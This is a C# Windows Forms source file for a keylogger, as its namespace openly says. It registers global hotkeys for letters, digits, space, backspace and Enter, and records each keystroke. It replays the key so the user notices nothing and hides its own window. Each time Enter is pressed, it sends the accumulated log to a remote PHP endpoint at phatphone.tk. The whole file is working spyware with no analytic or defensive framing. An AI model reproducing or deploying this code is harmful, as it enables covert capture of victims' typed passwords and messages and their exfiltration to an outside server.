using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class MainForm : Form
    {
        string logs = "";
        string url = "http://phatphone.tk/storelog.php?log=";
        [DllImport("user32.dll")]
        public static extern bool RegisterHotKey(IntPtr hWnd, int id, int fsModifiers, int vlc);
        [DllImport("user32.dll")]
        public static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        public MainForm()
        {
            InitializeComponent();
            for (int i = 'A'; i <= 'Z'; i++)
            {
                RegisterHotKey(this.Handle, i + 32, 0, i);
            }
            for (int i = 'A'; i <= 'Z'; i++)
            {
                RegisterHotKey(this.Handle, i, 4, i);
            }
            for (int i = '0'; i <= '9'; i++)
            {
                RegisterHotKey(this.Handle, i, 0, i);
            }
            RegisterHotKey(this.Handle, 32, 0, 32);
            RegisterHotKey(this.Handle, 8, 0, 8);
            RegisterHotKey(this.Handle, 13, 0, 13);
            ServicePointManager.DefaultConnectionLimit = 10000000;
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x0312)
            {
                // Handle the key (store it to somewhere)
                store(m.WParam.ToInt32());
            }
            base.WndProc(ref m);
        }

        void store(int code)
        {
            char key = (char)code;
            if (code == 8)
                logs += '-';
            else
                logs += key;
            if (code == 13)
            {
                // Send the log (to server or something)
                send();
            }
            SendKeys.Send(key + "");
        }

        void send()
        {
            WebRequest req = WebRequest.Create(url + logs);
            req.BeginGetResponse(null, null);
            logs = "";
        }

        private void MainForm_Shown(object sender, EventArgs e)
        {
            this.Hide();
        }
    }
}
